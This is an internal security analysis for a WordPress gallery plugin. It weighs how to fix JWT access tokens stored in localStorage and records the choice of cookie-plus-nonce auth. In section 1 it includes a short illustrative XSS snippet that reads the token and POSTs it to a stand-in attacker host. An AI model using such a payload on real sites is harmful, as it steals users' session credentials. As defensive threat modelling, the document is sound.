# JWT Auth Storage — In-Depth Analysis

**Date:** March 4, 2026  
**Reference:** Action item A-1 from [PRODUCTION_READINESS_ACTION_ITEMS.md](PRODUCTION_READINESS_ACTION_ITEMS.md)  
**Severity:** CRITICAL  
**Purpose:** Provide detailed analysis of the vulnerability and pros/cons for each remediation option so you can make an informed decision.

---

## Table of Contents

- [1. The Vulnerability Explained](#1-the-vulnerability-explained)
- [2. How the Current System Works](#2-how-the-current-system-works)
- [3. Why This Matters](#3-why-this-matters)
- [4. Option 1 — Drop JWT for Same-Origin (WP Nonce-Only)](#4-option-1--drop-jwt-for-same-origin-wp-nonce-only)
- [5. Option 2 — In-Memory Tokens with httpOnly Refresh Cookie](#5-option-2--in-memory-tokens-with-httponly-refresh-cookie)
- [6. Comparison Matrix](#6-comparison-matrix)
- [7. Recommendation](#7-recommendation)

---

## 1. The Vulnerability Explained

### What is stored

`WpJwtProvider.ts` stores three items in `localStorage`:

| Key | Contents | Sensitivity |
|-----|----------|-------------|
| `wpsg_access_token` | Full JWT (header.payload.signature) — grants API access as the authenticated user | **CRITICAL** — equivalent to a session credential |
| `wpsg_user` | `{ id, email, role }` — user profile data | Medium — PII |
| `wpsg_permissions` | Array of campaign IDs the user can access | Low |

### The attack vector

`localStorage` is accessible to **any JavaScript executing on the same origin**. This means:

1. **XSS (Cross-Site Scripting)** — If an attacker can execute arbitrary JavaScript on the WordPress site (e.g., via a stored XSS in a comment, a vulnerable third-party plugin, or a malicious ad script), they can read the JWT:
   ```javascript
   // Attacker's injected script:
   const token = localStorage.getItem('wpsg_access_token');
   fetch('https://attacker.com/steal', { method: 'POST', body: token });
   ```

2. **Token exfiltration is silent** — Unlike cookie theft (which browsers protect with `httpOnly`, `Secure`, `SameSite` flags), there is no browser mechanism to prevent JavaScript from reading `localStorage`. The user sees no warning or prompt.

3. **Stolen tokens work from anywhere** — JWT Bearer tokens are not bound to the user's session, IP, or browser. An attacker who exfiltrates the token can use it from their own machine until it expires.

4. **Long-lived exposure** — JWTs from the `jwt-auth` plugin typically have 7-day expiry. A stolen token provides a week of full API access.

### Why Shadow DOM doesn't help

The plugin renders inside Shadow DOM (mode: `open`), but:
- `localStorage` is per-origin, not per-Shadow-DOM tree
- `open` mode Shadow DOM is traversable from the outer document via `element.shadowRoot`
- Any XSS in the host page (outside the plugin) can still read `localStorage`

### Real-world likelihood

WordPress sites commonly run 10–30 plugins. Each plugin is an XSS attack surface. The WordPress ecosystem has a steady stream of XSS CVEs — [WPScan](https://wpscan.com/) reports hundreds per year. Storing bearer tokens in `localStorage` on a WordPress site is substantially riskier than doing so on a controlled SPA with no third-party code.

---

## 2. How the Current System Works

The plugin uses a **dual-auth system** where both mechanisms are active simultaneously:

### Auth flow diagram

```
┌─────────────────────────────────────────────────────────┐
│                    Browser (same-origin)                  │
│                                                          │
│  WordPress login cookie ───────── wp_rest nonce           │
│       (httpOnly)              (from __WPSG_CONFIG__)      │
│            │                         │                    │
│            │     ┌───────────┐       │                    │
│            └────►│ apiClient │◄──────┘                    │
│                  │ sends BOTH│                            │
│  localStorage ──►│  headers  │                            │
│  (JWT token)     └─────┬─────┘                            │
│                        │                                  │
│         Authorization: Bearer <jwt>                       │
│         X-WP-Nonce: <nonce>                               │
└────────────────────────┬──────────────────────────────────┘
                         │
                         ▼
┌─────────────────────────────────────────────────────────┐
│                    WordPress REST API                     │
│                                                          │
│  jwt-auth plugin: determine_current_user filter           │
│      └── Validates JWT → sets current user               │
│                                                          │
│  require_admin():                                        │
│      ├─ current_user_can('manage_wpsg') ← set by JWT     │
│      ├─ If Bearer header present → skip nonce check ✅    │
│      └─ If no Bearer → verify X-WP-Nonce ✅              │
└─────────────────────────────────────────────────────────┘
```

### Key observation

For **same-origin usage** (admin panel embedded in WordPress, shortcode on the same site), the WP login cookie + nonce is already sufficient and is already being sent. The JWT is redundant in this scenario — WordPress has already authenticated the user via the cookie, and the nonce protects against CSRF.

The JWT is only **necessary** for:
- Cross-origin API calls (headless frontend on a different domain)
- Third-party integrations that can't use cookie auth
- Automated/scripted API access

---

## 3. Why This Matters

| Factor | Assessment |
|--------|-----------|
| **Exploitability** | Low–Medium. Requires an XSS vulnerability on the same WP site. But given the WordPress ecosystem's XSS track record, this is a realistic threat. |
| **Impact** | High. Full API access as the victim user (including admin operations if the victim is an admin). |
| **Blast radius** | All WPSG admin users who have logged in via JWT. Tokens persist in localStorage for up to 7 days. |
| **Detection difficulty** | High. Token theft via XSS is invisible to the victim and to server-side monitoring. |
| **OWASP classification** | A07:2021 — Identification and Authentication Failures |

---

## 4. Option 1 — Drop JWT for Same-Origin (WP Nonce-Only)

### How it works

For the default same-origin deployment:
1. Remove `WpJwtProvider` from the default auth flow entirely
2. Rely exclusively on the WordPress login cookie (already `httpOnly`) + `X-WP-Nonce` (already injected via `__WPSG_CONFIG__.restNonce`)
3. Remove all `localStorage` token storage
4. The `AuthContext` detects authentication via the nonce's validity (WordPress returns `wp_get_current_user()` for cookie-authenticated requests)

For cross-origin/headless use cases:
- Keep the JWT auth path available as an opt-in, documented feature
- Guard it behind a constant: `define('WPSG_ENABLE_JWT_AUTH', true)` in `wp-config.php`
- When enabled, provide a separate login page/flow that stores the token in memory (not `localStorage`)

### Changes required

| File | Change |
|------|--------|
| `WpJwtProvider.ts` | Keep file but don't instantiate by default; only used when `WPSG_ENABLE_JWT_AUTH` is true |
| `apiClient.ts` `buildAuthHeaders()` | Send only `X-WP-Nonce` when no explicit auth provider is configured |
| `AuthContext.tsx` | Detect authenticated state via a lightweight `/permissions` call with cookie auth |
| `src/main.tsx` or `App.tsx` | Don't create `WpJwtProvider` instance unless cross-origin config detected |
| `class-wpsg-rest.php` `require_admin()` | No change needed — it already supports nonce-only auth as a fallback |

### Pros

| Advantage | Detail |
|-----------|--------|
| **Eliminates the vulnerability entirely** | No tokens in `localStorage` = nothing to steal via XSS |
| **Zero additional server-side code** | WP cookie + nonce auth already works; we're removing code, not adding it |
| **Simpler mental model** | One auth mechanism for 95 %+ of deployments |
| **Browser-managed security** | `httpOnly` cookies cannot be read by JavaScript; `SameSite` prevents CSRF; nonce provides additional CSRF protection |
| **No token refresh logic needed** | WP login cookies have server-managed expiry with built-in "remember me" support |
| **Smallest diff** | Primarily deletion of code paths, not addition |

### Cons

| Disadvantage | Detail | Mitigation |
|--------------|--------|------------|
| **Breaks cross-origin deployments** | Headless frontends on different domains can't use cookie auth | Provide opt-in JWT mode behind `WPSG_ENABLE_JWT_AUTH` constant |
| **Breaks third-party API consumers** | External scripts/apps that authenticate via JWT would stop working | Same opt-in constant; document the migration path |
| **No offline/cached auth state** | Without a stored token, the app can't determine auth state offline (SPA refresh loads unauthenticated) | Minor issue — WordPress admin is not designed for offline use; galleryviewing is public and doesn't need auth |
| **Login experience changes** | Users currently see a JWT login form in the admin panel; this would be removed in favor of "you must be logged into WordPress" | More consistent with how other WP plugins work |
| **Nonce expiry** | WP nonces expire after ~24 hours of inactivity; long-running tabs may see 403s | Add a heartbeat check that refreshes the nonce via `wp_create_nonce('wp_rest')` — standard WP pattern used by Gutenberg |

### Effort estimate

**Small–Medium (1–2 days)**
- Day 1: Refactor auth initialization; remove `localStorage` usage from default path; test same-origin flow end-to-end
- Day 2: Add opt-in JWT constant; update documentation; test cross-origin flow still works when enabled

---

## 5. Option 2 — In-Memory Tokens with httpOnly Refresh Cookie

### How it works

1. Add a new server-side endpoint: `POST /wp-super-gallery/v1/auth/refresh`
2. On login, the server returns the JWT in the response body **and** sets a `httpOnly`, `Secure`, `SameSite=Strict` refresh cookie
3. The client stores the JWT in a JavaScript variable (closure/module scope), **not** in `localStorage`
4. JWT has a short expiry (5 minutes)
5. When the JWT expires (or a 401 is received), the client calls `/auth/refresh` — the browser automatically sends the refresh cookie, and the server issues a new JWT
6. On page refresh, the in-memory token is lost → the client silently calls `/auth/refresh` to get a new one

### Changes required

| File | Change |
|------|--------|
| `class-wpsg-rest.php` | Add `POST /auth/refresh` endpoint that validates the refresh cookie and issues a new short-lived JWT |
| `class-wpsg-rest.php` | Modify login response to set `httpOnly` refresh cookie via `setcookie()` |
| `WpJwtProvider.ts` | Replace `localStorage` with in-memory variable; add refresh-on-401 logic |
| `apiClient.ts` | Add 401 → refresh → retry logic (token refresh interceptor) |
| `AuthContext.tsx` | Handle the "refreshing" state during silent token renewal |

### Token lifecycle diagram

```
Login:
  Client → POST /jwt-auth/v1/token (username + password)
  Server → { token: "<5-min JWT>" }
         + Set-Cookie: wpsg_refresh=<opaque-token>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=604800

API request:
  Client → Authorization: Bearer <5-min JWT>
  Server → 200 OK (if token valid)

Token expired:
  Client → Authorization: Bearer <expired JWT>
  Server → 401 Unauthorized
  Client → POST /wp-super-gallery/v1/auth/refresh
           (browser auto-sends wpsg_refresh cookie)
  Server → { token: "<new 5-min JWT>" }
  Client → Retry original request with new token

Page refresh:
  Client → (in-memory token lost)
  Client → POST /wp-super-gallery/v1/auth/refresh
           (browser auto-sends wpsg_refresh cookie)
  Server → { token: "<5-min JWT>" }
  Client → Continue as authenticated
```

### Pros

| Advantage | Detail |
|-----------|--------|
| **Works cross-origin** | JWT Bearer tokens work across domains; refresh cookie can be set with `SameSite=None; Secure` for cross-origin |
| **XSS exposure reduced to 5 minutes** | Even if an attacker reads the in-memory token via XSS, it expires in 5 minutes (vs 7 days currently) |
| **Refresh token is httpOnly** | The long-lived credential (refresh token) cannot be read by JavaScript |
| **Transparent to API consumers** | External integrations using Bearer tokens continue to work |
| **Industry-standard pattern** | OAuth 2.0 access/refresh token rotation is a well-understood pattern |

### Cons

| Disadvantage | Detail | Mitigation |
|--------------|--------|------------|
| **Significantly more complex** | New endpoint, cookie management, retry logic, race conditions during concurrent refreshes | Use a token refresh queue that serializes concurrent 401→refresh flows |
| **XSS still leaks the access token** | The in-memory token *is* readable by JavaScript — XSS can still steal it. The window is just shorter (5 min vs 7 days). | Acknowledged — this is a mitigation, not an elimination |
| **XSS can use the refresh cookie** | If an attacker has XSS, they can call `/auth/refresh` from the victim's browser (the cookie is sent automatically) and get a fresh token. The attacker can repeatedly refresh. | This is a fundamental limitation of any cookie-based auth under XSS. The attacker's access is limited to the duration of the XSS payload execution (not persistent across sessions). |
| **Refresh cookie + CSRF** | A `SameSite=Strict` cookie mitigates CSRF, but `SameSite=None` (needed for cross-origin) requires additional CSRF protection on the refresh endpoint | Add a CSRF token or require a custom header on the refresh endpoint |
| **Race conditions** | Multiple tabs or concurrent requests may trigger simultaneous refreshes | Implement a refresh lock (single in-flight refresh promise shared across callers) |
| **Server-side state** | Refresh tokens need server-side storage for revocation (e.g., token family tracking for refresh token rotation) | Use the existing `wp_options` or a custom table to store active refresh tokens |
| **Cookie-SameSite complexity** | Different `SameSite` values needed for same-origin vs cross-origin deployments — misconfiguration risk | Default to `Strict`; document `None` for cross-origin |
| **Larger implementation effort** | ~2–4 days vs ~1–2 days for Option 1 | — |

### Effort estimate

**Medium–Large (2–4 days)**
- Day 1: Implement `/auth/refresh` endpoint with refresh cookie issuance
- Day 2: Refactor `WpJwtProvider` for in-memory storage + refresh-on-401 logic
- Day 3: Handle edge cases (concurrent refreshes, multi-tab, cookie expiry, CSRF)
- Day 4: Testing across same-origin and cross-origin scenarios

---

## 6. Comparison Matrix

| Criterion | Option 1 (Nonce-Only) | Option 2 (In-Memory + Refresh) |
|-----------|----------------------|-------------------------------|
| **XSS token theft** | ✅ Eliminated — no JS-accessible tokens | ⚠️ Reduced (5-min window) — token still in JS memory |
| **XSS session hijacking** | ✅ Not possible — cookie is httpOnly | ⚠️ Attacker can call `/auth/refresh` during XSS execution |
| **Cross-origin support** | ⚠️ Opt-in only (needs `WPSG_ENABLE_JWT_AUTH` constant) | ✅ Native — Bearer tokens work cross-origin |
| **Implementation complexity** | ✅ Low — mostly code removal | ❌ High — new endpoint, cookie mgmt, retry logic |
| **Maintenance burden** | ✅ Low — delegates to WordPress core auth | ❌ Medium — custom token lifecycle to maintain |
| **Third-party API access** | ⚠️ Requires opt-in JWT or application passwords | ✅ Works as-is |
| **Browser compatibility** | ✅ Universal — standard cookie auth | ✅ Universal — standard cookie + fetch |
| **Effort** | 1–2 days | 2–4 days |
| **Regression risk** | Low — removing code paths | Medium — adding new server/client logic |
| **WordPress ecosystem alignment** | ✅ How 99% of WP plugins authenticate | ⚠️ Unusual for WP plugins |

---

## 7. Recommendation

**Option 1 (Drop JWT for same-origin, WP nonce-only)** is recommended for the following reasons:

1. **It eliminates the vulnerability** rather than reducing the window. Option 2 still allows token theft during XSS — it just limits the damage window to 5 minutes. More importantly, Option 2's refresh cookie can be exploited during XSS execution to continuously mint new tokens.

2. **It's simpler.** The nonce auth path already works. The change is primarily code deletion, not code addition. Less code = fewer bugs.

3. **It aligns with WordPress conventions.** No mainstream WordPress plugin uses JWT for same-origin admin panel authentication. WordPress core's own Gutenberg editor uses cookie + nonce auth exclusively.

4. **Cross-origin support is preserved** as an opt-in feature for the minority of deployments that need it.

5. **It's half the effort** — 1–2 days vs 2–4 days, with lower regression risk.

The only scenario where Option 2 is preferable is if a significant percentage of deployments use cross-origin API access **and** you want JWT to be the default (not opt-in) auth mechanism. Based on the current codebase (shortcode-embedded SPA, admin panel), same-origin is the primary deployment model.

---

*Decision: **Option 1 (nonce-only default)** selected on March 5, 2026. Implemented as Track P20-K in [PHASE20_REPORT.md](PHASE20_REPORT.md). JWT code commented out (not deleted) with `WPSG_ENABLE_JWT` env-var gate for future cross-origin use. Option 2 (in-memory tokens + httpOnly refresh cookie) recorded in [FUTURE_TASKS.md](FUTURE_TASKS.md) § Access Control.*
